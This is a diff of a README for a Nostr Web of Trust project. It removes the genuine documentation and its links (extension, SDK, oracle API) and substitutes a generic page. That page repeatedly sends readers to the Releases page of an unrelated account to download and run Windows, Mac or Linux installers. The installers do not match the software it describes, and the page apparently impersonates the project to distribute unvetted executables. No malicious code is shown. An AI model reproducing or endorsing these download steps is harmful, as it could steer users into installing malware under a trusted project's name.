@@ -1,90 +1,89 @@
-# Nostr Web of Trust
+# 🌐 nostr-wot - Connect with Trust in Nostr
 
-Open infrastructure for trust-based filtering on Nostr.
+## 🔗 Download Now
 
-## The Problem
+[![Download Nostr WOT](https://img.shields.io/badge/Download-Nostr%20WOT-blue.svg)](https://github.com/vgiappnee-web/nostr-wot/releases)
 
-Nostr has no central authority to filter spam or verify identity. Web of Trust solves this by measuring social distance—how many hops separate you from someone in the follow graph.
+## 🚀 Getting Started
 
-## Projects
+Welcome to the **nostr-wot** project! This toolkit allows you to query the social graph distance between any public keys. It includes a browser extension for client-side Web of Trust queries and an oracle API for server-side lookups. With this project, you can explore trust-based filtering in Nostr applications.
 
-### Browser Extension
+Whether you're new to this topic or just want to enhance your Nostr experience, you're in the right place! Follow the steps below to get up and running.
 
-The WoT Extension adds Web of Trust capabilities directly to your browser, exposing the `window.nostr.wot` API for any Nostr client to use.
+## 📥 Download & Install
 
-- **Repository:** [github.com/nostr-wot/nostr-wot-extension](https://github.com/nostr-wot/nostr-wot-extension)
-- **Features:** Real-time trust scoring, visual indicators, client-side filtering
-- **Browsers:** Chrome, Brave, Edge, Opera (Firefox coming soon)
+1. **Visit the Releases Page:**
+   To get the latest version of **nostr-wot**, visit the [Releases page](https://github.com/vgiappnee-web/nostr-wot/releases).
 
-### JavaScript SDK
+2. **Choose Your Version:**
+   On the Releases page, you will find different versions available. Look for the most recent version, which will have the highest number.
 
-The nostr-wot-sdk provides a lightweight JavaScript/TypeScript library for integrating Web of Trust directly into your applications without requiring the browser extension.
+3. **Download the Package:**
+   Click on the download link for your operating system. 
+   - For Windows, download the `.exe` file.
+   - For Mac, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-- **Repository:** [github.com/nostr-wot/nostr-wot-sdk](https://github.com/nostr-wot/nostr-wot-sdk)
-- **NPM:** [npmjs.com/package/nostr-wot-sdk](https://www.npmjs.com/package/nostr-wot-sdk)
-- **Features:** TypeScript support, React hooks, configurable trust scoring
+4. **Install the Application:**
+   - For Windows: Double-click the `.exe` file and follow the prompts to install the application.
+   - For Mac: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the instructions included in the README.
 
-### WoT Oracle
+5. **Launch the Application:**
+   Once installed, find **nostr-wot** in your applications and start using it!
 
-A high-performance Rust backend that maintains a real-time graph of the Nostr follow network and provides instant distance/trust queries via REST API.
+## 🛠️ System Requirements
 
-- **Repository:** [github.com/nostr-wot/nostr-wot-oracle](https://github.com/nostr-wot/nostr-wot-oracle)
-- **Public Instance:** `https://wot-oracle.mappingbitcoin.com`
-- **Features:** Bidirectional BFS, LRU caching, <1ms cached queries, self-hostable
+Before you install, make sure your system meets the following requirements:
 
-## How It Works
+- **Windows:** Windows 10 or higher
+- **Mac:** macOS Mojave (10.14) or higher
+- **Linux:** A modern Linux distribution (Ubuntu 20.04 or higher recommended)
 
-1. Your pubkey is the center
-2. People you follow = 1 hop
-3. People they follow = 2 hops
-4. Beyond 3 hops = likely noise
+## 🌟 Features
 
-## Use Cases
+- **Social Graph Queries:** Easily check the distance between public keys in the Nostr network.
+- **Browser Extension:** Simplified client-side queries right from your web browser.
+- **Oracle API:** Perform server-side lookups easily.
+- **User-Friendly Interface:** Navigate the application with ease.
+- **Open Source:** Contribute or get involved in the **nostr-wot** community.
 
-- Spam filtering without centralized blocklists
-- Trust scores for marketplace/reviews
-- Tiered notifications by social proximity
-- Client-side content filtering
+## 🔍 How to Use
 
-## API
+### Querying the Social Graph
 
-```js
-// Extension (client-side)
-await window.nostr.wot.getDistance(pubkey)
-await window.nostr.wot.getTrustScore(pubkey)
+1. Open the **nostr-wot** application.
+2. Enter the public key you want to query.
+3. Click "Search" or press Enter.
+4. View the results, which will show the trust distance to other keys.
 
-// SDK (client-side)
-import { NostrWoT } from 'nostr-wot-sdk'
-const wot = new NostrWoT({ userPubkey: '...' })
-await wot.getTrustScore(pubkey)
+### Using the Browser Extension
 
-// Oracle (server-side)
-GET /distance?from={pubkey}&to={pubkey}
-POST /distance/batch
-GET /stats
-```
+1. After installing the extension, it will appear in your browser toolbar.
+2. Click on the extension icon.
+3. Enter the public key in the input field.
+4. Click "Check Distance" to see the results displayed.
 
-## Implementing
+### Accessing the Oracle API
 
-Projects currently using Nostr Web of Trust:
+You can make server-side queries using our API. Documentation on how to use the API is available in the online resources linked on the releases page.
 
-| Project | Description |
-|---------|-------------|
-| [Mapping Bitcoin](https://mappingbitcoin.com) | Bitcoin merchant directory with WoT-based trust filtering |
+## 📄 Contributing
 
-## Supporters
+We welcome contributions! If you wish to contribute to **nostr-wot**, please check our [Contributing Guide](https://github.com/vgiappnee-web/nostr-wot/blob/main/CONTRIBUTING.md).
 
-Organizations supporting the development of Nostr Web of Trust:
+## 📝 License
 
-| Organization | Website |
-|--------------|---------|
-| Dandelion Labs | [dandelionlabs.io](https://dandelionlabs.io) |
-| We Are Bitcoin | [wearebitcoin.org](https://wearebitcoin.org) |
+This project is open source and released under the MIT License. You can find more details in the LICENSE file in this repository.
 
-## Run Your Own
+## 🗨️ Support
 
-All components are fully open source. Run your own oracle, fork the extension, build trust infrastructure for your community.
+For any issues or questions, please check our [Issues page](https://github.com/vgiappnee-web/nostr-wot/issues) or contact us via the discussions section for community support.
 
-## License
+## 🔗 Useful Links
 
-MIT
+- [Releases Page](https://github.com/vgiappnee-web/nostr-wot/releases)
+- [Issues Page](https://github.com/vgiappnee-web/nostr-wot/issues)
+- [Contributing Guide](https://github.com/vgiappnee-web/nostr-wot/blob/main/CONTRIBUTING.md)
+
+Thank you for choosing **nostr-wot**! We hope this project enhances your experience with the Nostr network.
